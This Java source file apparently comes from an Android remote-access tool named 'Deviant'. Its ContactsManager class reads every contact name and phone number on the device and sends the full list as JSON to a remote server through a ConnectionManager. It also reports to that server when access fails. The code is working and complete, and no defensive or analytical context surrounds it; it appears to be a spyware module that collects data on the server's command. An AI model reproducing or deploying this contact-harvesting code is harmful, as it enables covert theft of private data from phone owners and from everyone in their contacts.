package com.Deviant.pro;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {

    private static final String TAG = "ContactsManager";

    private static final String[] PROJECTION = {
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
    };

    private static final String SORT_ORDER =
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";

    public static void getContacts(Context context) {

        // Guard: check READ_CONTACTS permission before querying
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CONTACTS permission not granted — aborting");
            sendError("permission_denied");
            return;
        }

        JSONArray list = new JSONArray();

        // try-with-resources ensures cursor is always closed, even on exception
        try (Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                PROJECTION,
                null,
                null,
                SORT_ORDER)) {

            if (cursor == null) {
                Log.w(TAG, "Contacts cursor is null");
                sendError("cursor_null");
                return;
            }

            int nameCol   = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberCol = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.NUMBER);

            if (nameCol == -1 || numberCol == -1) {
                Log.e(TAG, "Required column missing from cursor");
                sendError("column_missing");
                return;
            }

            while (cursor.moveToNext()) {
                try {
                    String name   = cursor.getString(nameCol);
                    String number = cursor.getString(numberCol);

                    // Skip entries with no name or number
                    if (name == null || name.trim().isEmpty()) continue;
                    if (number == null || number.trim().isEmpty()) continue;

                    JSONObject contact = new JSONObject();
                    contact.put("name",   name.trim());
                    contact.put("number", number.trim());
                    list.put(contact);

                } catch (JSONException e) {
                    // Skip this row but continue processing the rest
                    Log.w(TAG, "Skipping malformed contact row: " + e.getMessage());
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Failed to read contacts: " + e.getMessage(), e);
            sendError("read_failed");
            return;
        }

        // Send result even if list is empty so server knows query completed
        try {
            JSONObject res = new JSONObject();
            res.put("type",  "contacts");
            res.put("data",  list);
            res.put("count", list.length());
            ConnectionManager.send(res.toString());
            Log.d(TAG, "Sent " + list.length() + " contacts");
        } catch (JSONException e) {
            Log.e(TAG, "Failed to build response JSON: " + e.getMessage(), e);
        }
    }

    // -------------------------------------------------------------------------
    // Private helpers
    // -------------------------------------------------------------------------

    /** Notify the server that contacts could not be retrieved and why. */
    private static void sendError(String reason) {
        try {
            JSONObject err = new JSONObject();
            err.put("type",   "contacts");
            err.put("error",  reason);
            err.put("data",   new JSONArray());
            err.put("count",  0);
            ConnectionManager.send(err.toString());
        } catch (JSONException ignored) {}
    }
}
